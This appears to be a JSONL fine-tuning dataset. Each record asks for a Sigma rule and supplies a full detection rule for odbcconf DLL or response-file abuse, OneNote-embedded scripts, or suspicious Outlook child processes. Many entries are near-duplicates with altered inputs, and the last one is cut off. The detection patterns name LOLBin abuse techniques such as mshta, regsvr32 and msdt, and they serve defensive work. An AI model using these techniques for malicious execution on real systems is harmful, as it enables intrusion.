{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf odbcconf REGSVR .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe .dll odbcconf.exe REGSVR", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe REGSVR .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe \\\"odbcconf.exe\\\" \\\"REGSVR\\\" .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf odbcconf REGSVR .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe REGSVR .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe -f .rsp", "output": "title: Response File Execution Via Odbcconf.EXE\nid: 5f03babb-12db-4eec-8c82-7b4cb5580868\nrelated:\n    - id: 2d32dd6f-3196-4093-b9eb-1ad8ab088ca5\n      type: similar\n    - id: 65d2be45-8600-4042-b4c0-577a1ff8a60e\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -f '\n    selection_rsp_ext:\n        CommandLine|contains: '.rsp'\n    condition: all of selection_*\nfalsepositives:\n    - The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe \"odbcconf.exe\" -f .rsp", "output": "title: Response File Execution Via Odbcconf.EXE\nid: 5f03babb-12db-4eec-8c82-7b4cb5580868\nrelated:\n    - id: 2d32dd6f-3196-4093-b9eb-1ad8ab088ca5\n      type: similar\n    - id: 65d2be45-8600-4042-b4c0-577a1ff8a60e\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -f '\n    selection_rsp_ext:\n        CommandLine|contains: '.rsp'\n    condition: all of selection_*\nfalsepositives:\n    - The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf odbcconf -f .rsp", "output": "title: Response File Execution Via Odbcconf.EXE\nid: 5f03babb-12db-4eec-8c82-7b4cb5580868\nrelated:\n    - id: 2d32dd6f-3196-4093-b9eb-1ad8ab088ca5\n      type: similar\n    - id: 65d2be45-8600-4042-b4c0-577a1ff8a60e\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -f '\n    selection_rsp_ext:\n        CommandLine|contains: '.rsp'\n    condition: all of selection_*\nfalsepositives:\n    - The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe .rsp -f odbcconf.exe", "output": "title: Response File Execution Via Odbcconf.EXE\nid: 5f03babb-12db-4eec-8c82-7b4cb5580868\nrelated:\n    - id: 2d32dd6f-3196-4093-b9eb-1ad8ab088ca5\n      type: similar\n    - id: 65d2be45-8600-4042-b4c0-577a1ff8a60e\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -f '\n    selection_rsp_ext:\n        CommandLine|contains: '.rsp'\n    condition: all of selection_*\nfalsepositives:\n    - The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\onenote.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\exported\\ \\onenoteofflinecache_files\\", "output": "title: OneNote.EXE Execution of Malicious Embedded Scripts\nid: 84b1706c-932a-44c4-ae28-892b28a25b94\nstatus: test\ndescription: |\n    Detects the execution of malicious OneNote documents that contain embedded scripts.\n    When a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\nreferences:\n    - https://bazaar.abuse.ch/browse/tag/one/\nauthor: '@kostastsale'\ndate: 2023-02-02\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\onenote.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains:\n            - '\\exported\\'\n            - '\\onenoteofflinecache_files\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\onenote.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pws\"h.exe\" \\wscript.exe \\exported\\ \\onenoteofflinecache_files\\", "output": "title: OneNote.EXE Execution of Malicious Embedded Scripts\nid: 84b1706c-932a-44c4-ae28-892b28a25b94\nstatus: test\ndescription: |\n    Detects the execution of malicious OneNote documents that contain embedded scripts.\n    When a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\nreferences:\n    - https://bazaar.abuse.ch/browse/tag/one/\nauthor: '@kostastsale'\ndate: 2023-02-02\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\onenote.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains:\n            - '\\exported\\'\n            - '\\onenoteofflinecache_files\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\onenote \\cmd \\cscript \\mshta \\powershell \\pwsh \\wscript \\exported\\ \\onenoteofflinecache_files\\", "output": "title: OneNote.EXE Execution of Malicious Embedded Scripts\nid: 84b1706c-932a-44c4-ae28-892b28a25b94\nstatus: test\ndescription: |\n    Detects the execution of malicious OneNote documents that contain embedded scripts.\n    When a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\nreferences:\n    - https://bazaar.abuse.ch/browse/tag/one/\nauthor: '@kostastsale'\ndate: 2023-02-02\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\onenote.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains:\n            - '\\exported\\'\n            - '\\onenoteofflinecache_files\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\onenote.exe \\cmd.exe \\cscript.exe \\mshta.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\exported\\ \\onenoteofflinecache_files\\", "output": "title: OneNote.EXE Execution of Malicious Embedded Scripts\nid: 84b1706c-932a-44c4-ae28-892b28a25b94\nstatus: test\ndescription: |\n    Detects the execution of malicious OneNote documents that contain embedded scripts.\n    When a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\nreferences:\n    - https://bazaar.abuse.ch/browse/tag/one/\nauthor: '@kostastsale'\ndate: 2023-02-02\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\onenote.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        CommandLine|contains:\n            - '\\exported\\'\n            - '\\onenoteofflinecache_files\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OUTLOOK.EXE \\AppVLP.exe \\bash.exe \\cmd.exe \\cscript.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\msbuild.exe \\msdt.exe \\mshta.exe \\msiexec.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\schtasks.exe \\scrcons.exe \\scriptrunner.exe \\sh.exe \\svchost.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OUTLOOK.EXE \\AppVLP.exe \\bash.exe \\cmd.exe \\cscript.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\msbuild.exe \\msdt.exe \\mshta.exe \\msiexec.exe \\powershell.exe \\\"\\pwsh.exe\\\" \\regsvr32.exe \\schtasks.exe \\scrcons.exe \\scriptrunner.exe \\sh.exe \\svchost.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OUTLOOK \\AppVLP \\bash \\cmd \\cscript \\forfiles \\hh \\mftrace \\msbuild \\msdt \\mshta \\msiexec \\powershell \\pwsh \\regsvr32 \\schtasks \\scrcons \\scriptrunner \\sh \\svchost \\wmic \\wscript", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   